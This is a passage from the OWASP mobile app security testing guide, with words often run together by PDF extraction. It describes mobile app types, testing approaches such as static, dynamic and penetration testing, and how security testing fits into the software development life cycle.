Theseplatform-specificfeaturescomewiththeirownsetofpitfalls. Forexample,ifIPCAPIsaremisused,sensitivedata orfunctionalitymightbeunintentionallyexposedtootherappsrunningonthedevice. 26\nCode Quality and Exploit Mitigation (MASVS-CODE) Traditionalinjectionandmemorymanagementissuesaren’toftenseeninmobileappsduetothesmallerattacksurface. MobileappsmostlyinteractwiththetrustedbackendserviceandtheUI,soevenifmanybufferoverflowvulnerabilities exist in the app, those vulnerabilities usually don’t open up any useful attack vectors. The same applies to browser exploitssuchascross-sitescripting(XSSallowsattackerstoinjectscriptsintowebpages)thatareveryprevalentinweb apps. However,therearealwaysexceptions. XSSistheoreticallypossibleonmobileinsomecases,butit’sveryrareto seeXSSissuesthatanindividualcanexploit. This protection from injection and memory management issues doesn’t mean that app developers can get away with writingsloppycode. Followingsecuritybestpracticesresultsinhardened(secure)releasebuildsthatareresilientagainst tampering. FreesecurityfeaturesofferedbycompilersandmobileSDKshelpincreasesecurityandmitigateattacks. Anti-Tampering and Anti-Reversing (MASVS-RESILIENCE) Therearethreethingsyoushouldneverbringupinpoliteconversations: religion,politics,andcodeobfuscation. Many security experts dismiss client-side protections outright. However, software protection controls are widely used in the mobileappworld,sosecuritytestersneedwaystodealwiththeseprotections. Webelievethere’sabenefittoclient-side protectionsiftheyareemployedwithaclearpurposeandrealisticexpectationsinmindandaren’tusedtoreplacesecurity controls. Navigating the OWASP MASTG The MASTG contains descriptions of all requirements specified in the MASVS. The MASTG contains the following main sections: 1. The General Testing Guide contains a mobile app security testing methodology and general vulnerability analy- sis techniques as they apply to mobile app security. It also contains additional technical test cases that are OS- independent,suchasauthenticationandsessionmanagement,networkcommunications,andcryptography. 2. TheAndroidTestingGuidecoversmobilesecuritytestingfortheAndroidplatform,includingsecuritybasics,security testcases,reverseengineeringtechniquesandprevention,andtamperingtechniquesandprevention. 3. The iOS Testing Guide covers mobile security testing for the iOS platform, including an overview of the iOS OS, securitytesting,reverseengineeringtechniquesandprevention,andtamperingtechniquesandprevention. 27\nMobile Application Taxonomy The term “mobile application” or “mobile app” refers to a self-contained computer program designed to execute on a mobile device. Today, the Android and iOS operating systems cumulatively comprisemore than 99% of the mobile OS marketshare. Additionally,mobileInternetusagehassurpasseddesktopusageforthefirsttimeinhistory,makingmobile browsingandappsthemostwidespreadkindofInternet-capableapps. Inthisguide,we’llusetheterm“app”asageneraltermforreferringtoanykindofapplicationrunningonpopular mobileOSes. Inabasicsense,appsaredesignedtoruneitherdirectlyontheplatformforwhichthey’redesigned,ontopofasmart device’smobilebrowser,orusingamixofthetwo. Throughoutthefollowingchapter,wewilldefinecharacteristicsthat qualifyanappforitsrespectiveplaceinmobileapptaxonomyaswellasdiscussdifferencesforeachvariation. Native App Mobileoperatingsystems,includingAndroidandiOS,comewithaSoftwareDevelopmentKit(SDK)fordevelopingapps specifictotheOS.Suchappsarereferredtoasnativetothesystemforwhichtheyhavebeendeveloped. Whendiscussing an app, the general assumption is that it is a native app implemented in a standard programming language for the respectiveoperatingsystem-Objective-CorSwiftforiOS,andJavaorKotlinforAndroid. Nativeappsinherentlyhavethecapabilitytoprovidethefastestperformancewiththehighestdegreeofreliability. They usuallyadheretoplatform-specificdesignprinciples(e.g.theAndroidDesignPrinciples),whichtendstoresultinamore consistentuserinterface(UI)comparedtohybridorwebapps. Duetotheircloseintegrationwiththeoperatingsystem, native apps can directly access almost every component of the device (camera, sensors, hardware-backed key stores, etc.). Some ambiguity exists when discussing native apps for Android as the platform provides two development kits - the AndroidSDKandtheAndroidNDK.TheSDK,whichisbasedontheJavaandKotlinprogramminglanguage,isthedefault fordevelopingapps. TheNDK(orNativeDevelopmentKit)isaC/C++developmentkitusedfordevelopingbinarylibraries thatcandirectlyaccesslowerlevelAPIs(suchasOpenGL).Theselibrariescanbeincludedinregularappsbuiltwiththe SDK.Therefore,wesaythatAndroidnativeapps(i.e.builtwiththeSDK)mayhavenativecodebuiltwiththeNDK. Themostobviousdownsideofnativeappsisthattheytargetonlyonespecificplatform. Tobuildthesameappforboth AndroidandiOS,oneneedstomaintaintwoindependentcodebases,orintroduceoftencomplexdevelopmenttoolsto portasinglecodebasetotwoplatforms. Thefollowingframeworksareanexampleofthelatterandallowyoutocompile asinglecodebaseforbothAndroidandiOS. • Xamarin • GoogleFlutter • ReactNative AppsdevelopedusingtheseframeworksinternallyusetheAPIsnativetothesystemandofferperformanceequivalent tonativeapps. Also,theseappscanmakeuseofalldevicecapabilities,includingtheGPS,accelerometer,camera,the notificationsystem,etc. Sincethefinaloutputisverysimilartopreviouslydiscussednativeapps,appsdevelopedusing theseframeworkscanalsobeconsideredasnativeapps. Web App Mobilewebapps(orsimply,webapps)arewebsitesdesignedtolookandfeellikeanativeapp. Theseappsrunontopof adevice’sbrowserandareusuallydevelopedinHTML5,muchlikeamodernwebpage. Launchericonsmaybecreated toparallelthesamefeelofaccessinganativeapp;however,theseiconsareessentiallythesameasabrowserbookmark, simplyopeningthedefaultwebbrowsertoloadthereferencedwebpage. Webappshavelimitedintegrationwiththegeneralcomponentsofthedeviceastheyrunwithintheconfinesofabrowser (i.e.theyare“sandboxed”)andusuallylackinperformancecomparedtonativeapps. Sinceawebapptypicallytargets multiple platforms, their UIs do not follow some of the design principles of a specific platform. The biggest advantage is reduced development and maintenance costs associated with a single code base as well as enabling developers to 28\ndistributeupdateswithoutengagingtheplatform-specificappstores. Forexample,achangetotheHTMLfileforaweb app can serve as viable, cross-platform update whereas an update to a store-based app requires considerably more effort. Hybrid App Hybridappsattempttofillthegapbetweennativeandwebapps. Ahybridappexecuteslikeanativeapp,butamajority oftheprocessesrelyonwebtechnologies,meaningaportionoftheapprunsinanembeddedwebbrowser(commonly called“WebView”). Assuch,hybridappsinheritbothprosandconsofnativeandwebapps. A web-to-native abstraction layer enables access to device capabilities for hybrid apps not accessible to a pure web app. Dependingontheframeworkusedfordevelopment,onecodebasecanresultinmultipleappsthattargetdifferent platforms,withaUIcloselyresemblingthatoftheoriginalplatformforwhichtheappwasdeveloped. Followingisanon-exhaustivelistofmorepopularframeworksfordevelopinghybridapps: • ApacheCordova • Framework7 • Ionic • jQueryMobile • NativeScript • OnsenUI • SenchaTouch Progressive Web App ProgressiveWebApps(PWA)loadlikeregularwebpages, butdifferfromusualwebappsinseveralways. Forexample it’spossibletoworkofflineandaccesstomobiledevicehardwareispossible,thattraditionallyisonlyavailabletonative mobileapps. PWAs combine different open standards of the web offered by modern browsers to provide benefits of a rich mobile experience. A Web App Manifest, which is a simple JSON file, can be used to configure the behavior of the app after “installation”. PWAsaresupportedbyAndroidandiOS,butnotallhardwarefeaturesareyetavailable. ForexamplePushNotifications, FaceIDoniPhoneXorARKitforaugmentedrealityisnotavailableyetoniOS.AnoverviewofPWAandsupportedfeatures oneachplatformcanbefoundinaMediumarticlefromMaximilianoFirtman. What’s Covered in the Mobile Testing Guide Throughoutthisguide,wewillfocusonappsforAndroidandiOSrunningonsmartphones. Theseplatformsarecurrently dominating the market and also run on other device classes including tablets, smartwatches, smart TVs, automotive infotainmentunits,andotherembeddedsystems. Eveniftheseadditionaldeviceclassesareoutofscope,youcanstill applymostoftheknowledgeandtestingtechniquesdescribedinthisguidewithsomedeviancedependingonthetarget device. Given the vast amount of mobile app frameworks available it would be impossible to cover all of them exhaustively. Therefore, we focus on native apps on each operating system. However, the same techniques are also useful when dealingwithweborhybridapps(ultimately,nomattertheframework,everyappisbasedonnativecomponents). 29\nMobile Application Security Testing In the following sections we’ll provide a brief overview of general security testing principles and key terminology. The conceptsintroducedarelargelyidenticaltothosefoundinothertypesofpenetrationtesting,soifyouareanexperienced testeryoumaybefamiliarwithsomeofthecontent. Throughout the guide, we use “mobile app security testing” as a catchall phrase to refer to the evaluation of mobile appsecurityviastaticanddynamicanalysis. Termssuchas“mobileapppenetrationtesting”and“mobileappsecurity review” are used somewhat inconsistently in the security industry, but these terms refer to roughly the same thing. A mobileappsecuritytestisusuallypartofalargersecurityassessmentorpenetrationtestthatencompassestheclient- serverarchitectureandserver-sideAPIsusedbythemobileapp. Inthisguide,wecovermobileappsecuritytestingintwocontexts. Thefirstisthe“classical”securitytestcompletednear theendofthedevelopmentlifecycle. Inthiscontext,thetesteraccessesanearlyfinishedorproduction-readyversion oftheapp,identifiessecurityissues,andwritesa(usuallydevastating)report. Theothercontextischaracterizedbythe implementation of requirements and the automation of security tests from the beginning of the software development lifecycleonwards. Thesamebasicrequirementsandtestcasesapplytobothcontexts,butthehigh-levelmethodand thelevelofclientinteractiondiffer. Principles of Testing White-box Testing versus Black-box Testing Let’sstartbydefiningtheconcepts: • Black-box testing is conducted without the tester’s having any information about the app being tested. This processissometimescalled“zero-knowledgetesting”. Themainpurposeofthistestisallowingthetestertobehave likearealattackerinthesenseofexploringpossibleusesforpubliclyavailableanddiscoverableinformation. • White-box testing (sometimes called “full knowledge testing”) is the total opposite of black-box testing in the sensethatthetesterhasfullknowledgeoftheapp. Theknowledgemayencompasssourcecode,documentation, anddiagrams. Thisapproachallowsmuchfastertestingthanblack-boxtestingduetoitstransparencyandwith theadditionalknowledgegainedatestercanbuildmuchmoresophisticatedandgranulartestcases. • Gray-box testing is all testing that falls in between the two aforementioned testing types: some informationis providedtothetester(usuallycredentialsonly),andotherinformationisintendedtobediscovered. Thistypeof testing is an interesting compromise in the number of test cases, the cost, the speed, and the scope of testing. Gray-boxtestingisthemostcommonkindoftestinginthesecurityindustry. Westronglyadvisethatyourequestthesourcecodesothatyoucanusethetestingtimeasefficientlyaspossible. The tester’scodeaccessobviouslydoesn’tsimulateanexternalattack,butitsimplifiestheidentificationofvulnerabilitiesby allowingthetestertoverifyeveryidentifiedanomalyorsuspiciousbehavioratthecodelevel. Awhite-boxtestistheway togoiftheapphasn’tbeentestedbefore. EventhoughdecompilingonAndroidisstraightforward,thesourcecodemaybeobfuscated,andde-obfuscatingwillbe time-consuming. Timeconstraintsarethereforeanotherreasonforthetestertohaveaccesstothesourcecode. Vulnerability Analysis Vulnerability analysis is usually the process of looking for vulnerabilities in an app. Although this may be done manu- ally,automatedscannersareusuallyusedtoidentifythemainvulnerabilities. Staticanddynamicanalysisaretypesof vulnerabilityanalysis. Static versus Dynamic Analysis StaticApplicationSecurityTesting(SAST)involvesexamininganapp’scomponentswithoutexecutingthem,byanalyzing thesourcecodeeithermanuallyorautomatically. OWASPprovidesinformationaboutStaticCodeAnalysisthatmayhelp youunderstandtechniques,strengths,weaknesses,andlimitations. 30\nDynamic Application Security Testing (DAST) involves examining the app during runtime. This type of analysis can be manual or automatic. It usually doesn’t provide the information that static analysis provides, but it is a good way to detectinterestingelements(assets,features,entrypoints,etc.) fromauser’spointofview. Nowthatwehavedefinedstaticanddynamicanalysis,let’sdivedeeper. Static Analysis Duringstaticanalysis,themobileapp’ssourcecodeisreviewedtoensureappropriateimplementationofsecuritycontrols. Inmostcases,ahybridautomatic/manualapproachisused. Automaticscanscatchthelow-hangingfruit,andthehuman testercanexplorethecodebasewithspecificusagecontextsinmind. Manual Code Review A tester performs manual code review by manually analyzing the mobile app’s source code for security vulnerabilities. Methods range from a basic keyword search via the ‘grep’ command to a line-by-line examination of the source code. IDEs(IntegratedDevelopmentEnvironments)oftenprovidebasiccodereviewfunctionsandcanbeextendedwithvarious tools. A common approach to manual code analysis entails identifying key security vulnerability indicators by searching for certain APIs and keywords, such as database-related method calls like “executeStatement” or “executeQuery”. Code containingthesestringsisagoodstartingpointformanualanalysis. In contrast to automatic code analysis, manual code review is very good for identifying vulnerabilities in the business logic, standards violations, and design flaws, especially when the code is technically secure but logically flawed. Such scenariosareunlikelytobedetectedbyanyautomaticcodeanalysistool. Amanualcodereviewrequiresanexpertcodereviewerwhoisproficientinboththelanguageandtheframeworksused forthemobileapp. Fullcodereviewcanbeaslow, tedious, time-consumingprocessforthereviewer, especiallygiven largecodebaseswithmanydependencies. Automated Source Code Analysis AutomatedanalysistoolscanbeusedtospeedupthereviewprocessofStaticApplicationSecurityTesting(SAST).They checkthesourcecodeforcompliancewithapredefinedsetofrulesorindustrybestpractices, thentypicallydisplaya listoffindingsorwarningsandflagsforalldetectedviolations. Somestaticanalysistoolsrunagainstthecompiledapp only, somemustbefedtheoriginalsourcecode, andsomerunaslive-analysispluginsintheIntegratedDevelopment Environment(IDE). Althoughsomestaticcodeanalysistoolsincorporatealotofinformationabouttherulesandsemanticsrequiredtoanalyze mobileapps,theymayproducemanyfalsepositives,particularlyiftheyarenotconfiguredforthetargetenvironment. A securityprofessionalmustthereforealwaysreviewtheresults. Thechapter“TestingTools”includesalistofstaticanalysistools,whichcanbefoundattheendofthisbook. Dynamic Analysis The focus of DAST is the testing and evaluation of apps via their real-time execution. The main objective of dynamic analysisisfindingsecurityvulnerabilitiesorweakspotsinaprogramwhileitisrunning. Dynamicanalysisisconducted bothatthemobileplatformlayerandagainstthebackendservicesandAPIs,wherethemobileapp’srequestandresponse patternscanbeanalyzed. Dynamic analysis is usually used to check for security mechanisms that provide sufficient protection against the most prevalenttypesofattack,suchasdisclosureofdataintransit,authenticationandauthorizationissues,andservercon- figurationerrors. 31\nAvoiding False Positives Automated Scanning Tools Automatedtestingtools’lackofsensitivitytoappcontextisachallenge. Thesetoolsmayidentifyapotentialissuethat’s irrelevant. Suchresultsarecalled“falsepositives”. Forexample, securitytesterscommonlyreportvulnerabilitiesthatareexploitableinawebbrowserbutaren’trelevant to the mobile app. This false positive occurs because automated tools used to scan the backend service are based on regular browser-based web apps. Issues such as CSRF (Cross-site Request Forgery) and Cross-Site Scripting (XSS) are reportedaccordingly. Let’stakeCSRFasanexample. AsuccessfulCSRFattackrequiresthefollowing: • Theabilitytoenticethelogged-inusertoopenamaliciouslinkinthewebbrowserusedtoaccessthevulnerable site. • Theclient(browser)mustautomaticallyaddthesessioncookieorotherauthenticationtokentotherequest. Mobile apps don’t fulfill these requirements: even if WebViews and cookie-based session management are used, any maliciouslinktheuserclicksopensinthedefaultbrowser,whichhasaseparatecookiestore. Stored Cross-Site Scripting (XSS) can be an issue if the app includes WebViews, and it may even lead to command executioniftheappexportsJavaScriptinterfaces. However,reflectedCross-SiteScriptingisrarelyanissueforthereason mentionedabove(eventhoughwhethertheyshouldexistatallisarguable,escapingoutputissimplyabestpractice). In any case, consider exploit scenarios when you perform the risk assessment; don’t blindly trust your scanning tool’soutput. Penetration Testing (a.k.a. Pentesting) Theclassicapproachinvolvesall-aroundsecuritytestingoftheapp’sfinalornear-finalbuild,e.g.,thebuildthat’savailable attheendofthedevelopmentprocess. Fortestingattheendofthedevelopmentprocess, werecommendtheMobile AppSecurityVerificationStandard(MASVS)andtheassociatedchecklistasbaselinefortesting. Atypicalsecuritytestis structuredasfollows: • Preparation-definingthescopeofsecuritytesting,includingidentifyingapplicablesecuritycontrols,theorgani- zation’stestinggoals,andsensitivedata. Moregenerally,preparationincludesallsynchronizationwiththeclient aswellaslegallyprotectingthetester(whoisoftenathirdparty). Remember,attackingasystemwithoutwritten authorizationisillegalinmanypartsoftheworld! • IntelligenceGathering-analyzingtheenvironmentalandarchitecturalcontextoftheapptogainageneral contextualunderstanding. • MappingtheApplication-basedoninformationfromthepreviousphases;maybecomplementedbyautomated scanningandmanuallyexploringtheapp. Mappingprovidesathoroughunderstandingoftheapp,itsentrypoints, the data it holds, and the main potential vulnerabilities. These vulnerabilities can then be ranked according to thedamagetheirexploitationwouldcausesothatthesecuritytestercanprioritizethem. Thisphaseincludesthe creationoftestcasesthatmaybeusedduringtestexecution. • Exploitation-inthisphase,thesecuritytestertriestopenetratetheappbyexploitingthevulnerabilitiesidenti- fiedduringthepreviousphase. Thisphaseisnecessaryfordeterminingwhethervulnerabilitiesarerealandtrue positives. • Reporting - in this phase, which is essential to the client, the security tester reports the vulnerabilities. This includes the exploitation process in detail, classifies the type of vulnerability, documents the risk if an attacker wouldbeabletocompromisethetargetandoutlineswhichdatathetesterhasbeenabletoaccessillegitimately. Preparation Thesecuritylevelatwhichtheappwillbetestedmustbedecidedbeforetesting. Thesecurityrequirementsshouldbe decidedatthebeginningoftheproject. Differentorganizationshavedifferentsecurityneedsandresourcesavailablefor investingintestactivities. AlthoughthecontrolsinMASVSLevel1(L1)areapplicabletoallmobileapps,walkingthrough theentirechecklistofL1andLevel2(L2)MASVScontrolswithtechnicalandbusinessstakeholdersisagoodwaytodecide onaleveloftestcoverage. 32\nOrganizations may have different regulatory and legal obligations in certain territories. Even if an app doesn’t handle sensitivedata,someL2requirementsmayberelevant(becauseofindustryregulationsorlocallaws). Forexample,two- factorauthentication(2FA)maybeobligatoryforafinancialappandenforcedbyacountry’scentralbankand/orfinancial regulatoryauthorities. Securitygoals/controlsdefinedearlierinthedevelopmentprocessmayalsobereviewedduringthediscussionwithstake- holders. SomecontrolsmayconformtoMASVScontrols,butothersmaybespecifictotheorganizationorapp. Allinvolvedpartiesmustagreeonthedecisionsandthescopeinthechecklistbecausethesewilldefinethebaselinefor allsecuritytesting. Coordinating with the Client Settingupaworkingtestenvironmentcanbeachallengingtask. Forexample,restrictionsontheenterprisewirelessac- cesspointsandnetworksmayimpededynamicanalysisperformedatclientpremises. Companypoliciesmayprohibitthe useofrootedphonesor(hardwareandsoftware)networktestingtoolswithinenterprisenetworks. Appsthatimplement rootdetectionandotherreverseengineeringcountermeasuresmaysignificantlyincreasetheworkrequiredforfurther analysis. Security testing involves many invasive tasks, including monitoring and manipulating the mobile app’s network traffic, inspectingtheappdatafiles,andinstrumentingAPIcalls. Securitycontrols,suchascertificatepinningandrootdetection, mayimpedethesetasksanddramaticallyslowtestingdown. Toovercometheseobstacles,youmaywanttorequesttwooftheapp’sbuildvariantsfromthedevelopmentteam. One variantshouldbeareleasebuildsothatyoucandeterminewhethertheimplementedcontrolsareworkingproperlyand can’t be bypassed easily. The second variant should be a debug build for which certain security controls have been deactivated. Testingtwodifferentbuildsisthemostefficientwaytocoveralltestcases. Dependingonthescopeoftheengagement,thisapproachmaynotbepossible. Requestingbothproductionanddebug buildsforawhite-boxtestwillhelpyoucompletealltestcasesandclearlystatetheapp’ssecuritymaturity. Theclientmay preferthatblack-boxtestsbefocusedontheproductionappandtheevaluationofitssecuritycontrols’effectiveness. Thescopeofbothtypesoftestingshouldbediscussedduringthepreparationphase. Forexample,whetherthesecurity controlsshouldbeadjustedshouldbedecidedbeforetesting. Additionaltopicsarediscussedbelow. Identifying Sensitive Data Classifications of sensitive information differ by industry and country. In addition, organizations may take a restrictive viewofsensitivedata,andtheymayhaveadataclassificationpolicythatclearlydefinessensitiveinformation. Therearethreegeneralstatesfromwhichdatamaybeaccessible: • Atrest-thedataissittinginafileordatastore • Inuse-anapphasloadedthedataintoitsaddressspace • In transit-datahasbeenexchangedbetweenmobileappandendpointorconsumingprocessesonthedevice, e.g.,duringIPC(Inter-ProcessCommunication) The degree of scrutiny that’s appropriate for each state may depend on the data’s importance and likelihood of being accessed. Forexample,dataheldinappmemorymaybemorevulnerablethandataonwebserverstoaccessviacore dumpsbecauseattackersaremorelikelytogainphysicalaccesstomobiledevicesthantowebservers. Whennodataclassificationpolicyisavailable,usethefollowinglistofinformationthat’sgenerallyconsideredsensitive: • userauthenticationinformation(credentials,PINs,etc.) • PersonallyIdentifiableInformation(PII)thatcanbeabusedforidentitytheft: socialsecuritynumbers,creditcard numbers,bankaccountnumbers,healthinformation • deviceidentifiersthatmayidentifyaperson • highlysensitivedatawhosecompromisewouldleadtoreputationalharmand/orfinancialcosts • anydatawhoseprotectionisalegalobligation • anytechnicaldatageneratedbytheapp(oritsrelatedsystems)andusedtoprotectotherdataorthesystemitself (e.g.,encryptionkeys) Adefinitionof“sensitivedata”mustbedecidedbeforetestingbeginsbecausedetectingsensitivedataleakagewithout adefinitionmaybeimpossible. 33\nIntelligence Gathering Intelligencegatheringinvolvesthecollectionofinformationabouttheapp’sarchitecture,thebusinessusecasestheapp serves,andthecontextinwhichtheappoperates. Suchinformationmaybeclassifiedas“environmental”or“architec- tural”. Environmental Information Environmentalinformationincludes: • The organization’s goals for the app. Functionality shapes users’ interaction with the app and may make some surfacesmorelikelythanotherstobetargetedbyattackers. • Therelevantindustry. Differentindustriesmayhavedifferentriskprofiles. • Stakeholdersandinvestors;understandingwhoisinterestedinandresponsiblefortheapp. • Internal processes, workflows, and organizational structures. Organization-specific internal processes and work- flowsmaycreateopportunitiesforbusinesslogicvulnerabilities. Architectural Information Architecturalinformationincludes: • Themobileapp: Howtheappaccessesdataandmanagesitin-process,howitcommunicateswithotherresources andmanagesusersessions,andwhetheritdetectsitselfrunningonjailbrokenorrootedphonesandreactstothese situations. • TheOperatingSystem: TheoperatingsystemsandOSversionstheapprunson(includingAndroidoriOSversion restrictions),whethertheappisexpectedtorunondevicesthathaveMobileDeviceManagement(MDM)controls, andrelevantOSvulnerabilities. • Network: Usageofsecuretransportprotocols(e.g.,TLS),usageofstrongkeysandcryptographicalgorithms(e.g., SHA-2)tosecurenetworktrafficencryption,usageofcertificatepinningtoverifytheendpoint,etc. • Remote Services: Theremoteservicestheappconsumesandwhethertheirbeingcompromisedcouldcompro- misetheclient. Mapping the Application Oncethesecuritytesterhasinformationabouttheappanditscontext,thenextstepismappingtheapp’sstructureand content,e.g.,identifyingitsentrypoints,features,anddata. Whenpenetrationtestingisperformedinawhite-boxorgrey-boxparadigm,anydocumentsfromtheinterioroftheproject (architecturediagrams,functionalspecifications,code,etc.) maygreatlyfacilitatetheprocess. Ifsourcecodeisavailable, theuseofSASTtoolscanrevealvaluableinformationaboutvulnerabilities(e.g.,SQLInjection). DASTtoolsmaysupport black-boxtestingandautomaticallyscantheapp: whereasatesterwillneedhoursordays,ascannermayperformthe same task in a few minutes. However, it’s important to remember that automatic tools have limitations and will only find what they have been programmed to find. Therefore, human analysis may be necessary to augment results from automatictools(intuitionisoftenkeytosecuritytesting). Threat Modeling is an important artifact: documents from the workshop usually greatly support the identification of muchoftheinformationasecuritytesterneeds(entrypoints,assets,vulnerabilities,severity,etc.). Testersarestrongly advisedtodiscusstheavailabilityofsuchdocumentswiththeclient. Threatmodelingshouldbeakeypartofthesoftware developmentlifecycle. Itusuallyoccursintheearlyphasesofaproject. ThethreatmodelingguidelinesdefinedinOWASParegenerallyapplicabletomobileapps. Exploitation Unfortunately, time or financial constraints limit many pentests to application mapping via automated scanners (for vulnerability analysis, for example). Although vulnerabilities identified during the previous phase may be interesting, theirrelevancemustbeconfirmedwithrespecttofiveaxes: • Damagepotential-thedamagethatcanresultfromexploitingthevulnerability • Reproducibility-easeofreproducingtheattack • Exploitability-easeofexecutingtheattack 34\n• Affectedusers-thenumberofusersaffectedbytheattack • Discoverability-easeofdiscoveringthevulnerability Againstallodds,somevulnerabilitiesmaynotbeexploitableandmayleadtominorcompromises,ifany. Othervulnera- bilitiesmayseemharmlessatfirstsight,yetbedeterminedverydangerousunderrealistictestconditions. Testerswho carefullygothroughtheexploitationphasesupportpentestingbycharacterizingvulnerabilitiesandtheireffects. Reporting The security tester’s findings will be valuable to the client only if they are clearly documented. A good pentest report shouldincludeinformationsuchas,butnotlimitedto,thefollowing: • anexecutivesummary • adescriptionofthescopeandcontext(e.g.,targetedsystems) • methodsused • sourcesofinformation(eitherprovidedbytheclientordiscoveredduringthepentest) • prioritizedfindings(e.g.,vulnerabilitiesthathavebeenstructuredbyDREADclassification) • detailedfindings • recommendationsforfixingeachdefect ManypentestreporttemplatesareavailableontheInternet: Googleisyourfriend! Security Testing and the SDLC Althoughtheprinciplesofsecuritytestinghaven’tfundamentallychangedinrecenthistory,softwaredevelopmenttech- niqueshavechangeddramatically. WhilethewidespreadadoptionofAgilepracticeswasspeedingupsoftwaredevelop- ment,securitytestershadtobecomequickerandmoreagilewhilecontinuingtodelivertrustworthysoftware. Thefollowingsectionisfocusedonthisevolutionanddescribescontemporarysecuritytesting. Security Testing during the Software Development Life Cycle Software development is not very old, after all, so the end of developing without a framework is easy to observe. We haveallexperiencedtheneedforaminimalsetofrulestocontrolworkasthesourcecodegrows. In the past, “Waterfall” methodologies were the most widely adopted: development proceeded by steps that had a predefinedsequence. Limitedtoasinglestep,backtrackingcapabilitywasaseriousdrawbackofWaterfallmethodologies. Althoughtheyhaveimportantpositivefeatures(providingstructure,helpingtestersclarifywhereeffortisneeded,being clearandeasytounderstand,etc.),theyalsohavenegativeones(creatingsilos,beingslow,specializedteams,etc.). Assoftwaredevelopmentmatured,competitionincreasedanddevelopersneededtoreacttomarketchangesmorequickly while creating software products with smaller budgets. The idea of less structure became popular, and smaller teams collaborated, breaking silos throughout the organization. The “Agile” concept was born (Scrum, XP, and RAD are well- knownexamplesofAgileimplementations);itenabledmoreautonomousteamstoworktogethermorequickly. Security wasn’t originally an integral part of software development. It was an afterthought, performed at the network levelbyoperationteamswhohadtocompensateforpoorsoftwaresecurity! Althoughunintegratedsecuritywaspossible when software programs were located inside a perimeter, the concept became obsolete as new kinds of software con- sumptionemergedwithweb,mobile,andIoTtechnologies. Nowadays,securitymustbebakedinsidesoftwarebecause compensatingforvulnerabilitiesisoftenverydifficult. “SDLC”willbeusedinterchangeablywith“SecureSDLC”inthefollowingsectiontohelpyouinternalizetheideathat securityisapartofsoftwaredevelopmentprocesses. Inthesamespirit,weusethenameDevSecOpstoemphasize thefactthatsecurityispartofDevOps. 35\nSDLC Overview General Description of SDLC SDLCsalwaysconsistofthesamesteps(theoverallprocessissequentialintheWaterfallparadigmanditerativeinthe Agileparadigm): • Performariskassessmentfortheappanditscomponentstoidentifytheirriskprofiles. Theseriskprofilestypically depend on the organization’s risk appetite and applicable regulatory requirements. The risk assessment is also basedonfactors,includingwhethertheappisaccessibleviatheInternetandthekindofdatatheappprocesses andstores. Allkindsofrisksmustbetakenintoaccount: financial, marketing, industrial, etc. Dataclassification policiesspecifywhichdataissensitiveandhowitmustbesecured. • Security Requirements are determined at the beginning of a project or development cycle, when functional requirementsarebeinggathered. AbuseCasesareaddedasusecasesarecreated. Teams(includingdevelopment teams)maybegivensecuritytraining(suchasSecureCoding)iftheyneedit. YoucanusetheOWASPMASVSto determinethesecurityrequirementsofmobileappsonthebasisoftheriskassessmentphase. Iterativelyreviewing requirementswhenfeaturesanddataclassesareaddediscommon,especiallywithAgileprojects. • ThreatModeling,whichisbasicallytheidentification,enumeration,prioritization,andinitialhandlingofthreats, is a foundational artifact that must be performed as architecture development and design progress. Security Architecture, a Threat Model factor, can be refined (for both software and hardware aspects) after the Threat Modelingphase. SecureCodingrulesareestablishedandthelistofSecuritytoolsthatwillbeusediscreated. ThestrategyforSecuritytestingisclarified. • All security requirements and design considerations should be stored in the Application Life Cycle Management (ALM)system(alsoknownastheissuetracker)thatthedevelopment/opsteamusestoensuretightintegrationof security requirements into the development workflow. The security requirements should contain relevant source codesnippetssothatdeveloperscanquicklyreferencethesnippets. Creatingadedicatedrepositorythat’sunder versioncontrolandcontainsonlythesecodesnippetsisasecurecodingstrategythat’smorebeneficialthanthe traditionalapproach(storingtheguidelinesinworddocumentsorPDFs). • Securelydevelopthesoftware. Toincreasecodesecurity,youmustcompleteactivitiessuchasSecurityCode Reviews,StaticApplicationSecurityTesting,andSecurityUnitTesting. Althoughqualityanaloguesofthese securityactivitiesexist,thesamelogicmustbeappliedtosecurity,e.g.,reviewing,analyzing,andtestingcodefor securitydefects(forexample,missinginputvalidation,failingtofreeallresources,etc.). • Nextcomesthelong-awaitedreleasecandidatetesting: bothmanualandautomatedPenetrationTesting(“Pen- tests”). DynamicApplicationSecurityTestingisusuallyperformedduringthisphaseaswell. • After the software has been Accredited during Acceptance by all stakeholders, it can be safely transitioned to OperationteamsandputinProduction. • Thelastphase,toooftenneglected,isthesafeDecommissioningofsoftwareafteritsendofuse. Thepicturebelowillustratesallthephasesandartifacts: Basedontheproject’sgeneralriskprofile,youmaysimplify(orevenskip)someartifacts,andyoumayaddothers(formal 36\nintermediary approvals, formal documentation of certain points, etc.). Always remember two things: an SDLC is meant to reduce risks associated with software development, and it is a framework that helps you set up controlstothatend. ThisisagenericdescriptionofSDLC;alwaystailorthisframeworktoyourprojects. Defining a Test Strategy TeststrategiesspecifytheteststhatwillbeperformedduringtheSDLCaswellastestingfrequency. Teststrategiesare usedtomakesurethatthefinalsoftwareproductmeetssecurityobjectives,whicharegenerallydeterminedbyclients’ legal/marketing/corporateteams. TheteststrategyisusuallycreatedduringtheSecureDesignphase,afterriskshave beenclarified(duringtheInitiationphase)andbeforecodedevelopment(theSecureImplementationphase)begins. The strategyrequiresinputfromactivitiessuchasRiskManagement,previousThreatModeling,andSecurityEngineering. ATestStrategyneedn’tbeformallywritten: itmaybedescribedthroughStories(inAgileprojects),quicklyenumerated inchecklists,orspecifiedastestcasesforagiventool. However,thestrategymustdefinitelybesharedbecauseitmust beimplementedbyateamotherthantheteamwhodefinedit. Moreover,alltechnicalteamsmustagreetoittoensure thatitdoesn’tplaceunacceptableburdensonanyofthem. TestStrategiesaddresstopicssuchasthefollowing: • objectivesandriskdescriptions • plansformeetingobjectives,riskreduction,whichtestswillbemandatory,whowillperformthem,howandwhen theywillbeperformed • acceptancecriteria To track the testing strategy’s progress and effectiveness, metrics should be defined, continually updated during the project,andperiodicallycommunicated. Anentirebookcouldbewrittenaboutchoosingrelevantmetrics; themostwe cansayhereisthattheydependonriskprofiles,projects,andorganizations. Examplesofmetricsincludethefollowing: • thenumberofstoriesrelatedtosecuritycontrolsthathavebeensuccessfullyimplemented • codecoverageforunittestsofsecuritycontrolsandsensitivefeatures • thenumberofsecuritybugsfoundforeachbuildviastaticanalysistools • trendsinsecuritybugbacklogs(whichmaybesortedbyurgency) Theseareonlysuggestions;othermetricsmaybemorerelevanttoyourproject. Metricsarepowerfultoolsforgettinga projectundercontrol,providedtheygiveprojectmanagersaclearandsyntheticperspectiveonwhatishappeningand 